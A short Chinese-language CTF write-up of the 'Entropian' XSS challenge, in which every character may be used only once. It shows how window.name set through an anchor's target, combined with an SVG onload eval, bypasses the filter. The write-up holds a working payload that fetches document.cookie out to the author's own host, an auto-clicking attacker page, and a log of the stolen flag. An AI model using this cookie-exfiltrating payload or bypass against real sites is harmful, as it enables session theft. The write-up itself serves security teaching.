# Entropian

(賽中未解)

這題限制所有字元只能出現最多一次

然後要偷`document.cookie`

由於`<script src="xxx"></script>`太多重複字元

故很容易想到要用`eval()`之類的方式，去跑`location.hash`, `windwos.name`, ...之類的

最後發現`name`可以透過`<a>`的`target`來控制

所以exploit流程就是:

1. 用`<iframe>`引入我們的domain
2. 在我們domain首頁放一個`<a>`，把`target`設成我們的payload，`href`設成`<SVG/ONLoAD=eval(name)>` (記得encoding一下)
3. 再讓bot點擊這個link
4. 最後bot會執行我們的payload

<br>

細節如下:

kaibro.tw/index.html:

```
<a href="http://entropian-01.pwn.beer:3001/entropian?input=%3CSVG/ONLoAD=eval(n%26%2397;m\u{65})%3E" target="fetch('http://kaibro.tw/?'+document.cookie)" id="x">aaa</a>

<script>
document.getElementById('x').click();
</script>
```

最後把以下連結發給bot即可收到flag:

http://entropian-01.pwn.beer:3001/entropian?input=<IfrAme%20sRc=\/kaib%26%23x72;o.tw>

```
34.252.66.50 - - [24/May/2019:07:00:40 +0000] "GET /?flag=sctf{1_th0ught_h1GH_3ntr0py_w@s_sec00re?} HTTP/1.1" 200 568 "http://entropian-01.pwn.beer:3001/entropian?input=%3CSVG/ONLoAD=eval(n%26%2397;m\\u{65})%3E" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/76.0.3786.0 Safari/537.36"
```
